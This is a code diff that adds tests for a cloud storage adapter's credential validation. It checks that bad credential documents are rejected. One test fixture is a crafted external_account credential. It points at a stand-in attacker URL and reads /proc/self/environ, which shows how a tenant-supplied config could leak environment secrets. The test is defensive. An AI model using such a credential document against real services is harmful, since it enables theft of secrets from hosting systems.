@@ -70,6 +70,46 @@ function adapter(overrides: { bucket?: string; serviceAccountKey?: string } = {}
   });
 }
 
+// Runs without the emulator: the credential document is rejected before any
+// client is constructed, so there is nothing to connect to.
+describe('GCSAdapter credential validation', () => {
+  it('refuses an external_account document', async () => {
+    // google-auth-library dispatches on `type`. external_account would hand the
+    // document's author arbitrary local file reads (credential_source.file) and
+    // unguarded outbound requests (credential_source.url), exfiltrated to an
+    // attacker-chosen token_url. The config is tenant-supplied, so this document
+    // must never reach the SDK.
+    const result = await adapter({
+      serviceAccountKey: JSON.stringify({
+        type: 'external_account',
+        audience: '//iam.googleapis.com/projects/1/x',
+        subject_token_type: 'urn:ietf:params:oauth:token-type:jwt',
+        token_url: 'https://attacker.example/collect',
+        credential_source: { file: '/proc/self/environ' },
+      }),
+    }).testConnection();
+
+    expect(result.success).toBe(false);
+    expect(result.error).toContain('external_account');
+  });
+
+  it('refuses a document that is not JSON', async () => {
+    const result = await adapter({ serviceAccountKey: 'nope' }).testConnection();
+    expect(result.success).toBe(false);
+    expect(result.error).toContain('not valid JSON');
+  });
+
+  it('accepts a real service account key', async () => {
+    // Reaching a connection error (rather than a validation error) proves the
+    // document passed the type pin and a client was actually built.
+    const result = await adapter({
+      bucket: 'op-gcs-validation-only',
+      serviceAccountKey: SERVICE_ACCOUNT_KEY,
+    }).testConnection();
+    expect(result.error ?? '').not.toContain('Invalid service account key');
+  });
+});
+
 const available = await emulatorReachable();
 
 describe.skipIf(!available)('GCSAdapter (fake-gcs-server)', () => {
@@ -108,7 +148,7 @@ describe.skipIf(!available)('GCSAdapter (fake-gcs-server)', () => {
       }).testConnection();
 
       expect(res.success).toBe(false);
-      expect(res.error).toBe('Invalid service account key JSON');
+      expect(res.error).toBe('Invalid service account key: not valid JSON');
     });
   });
 
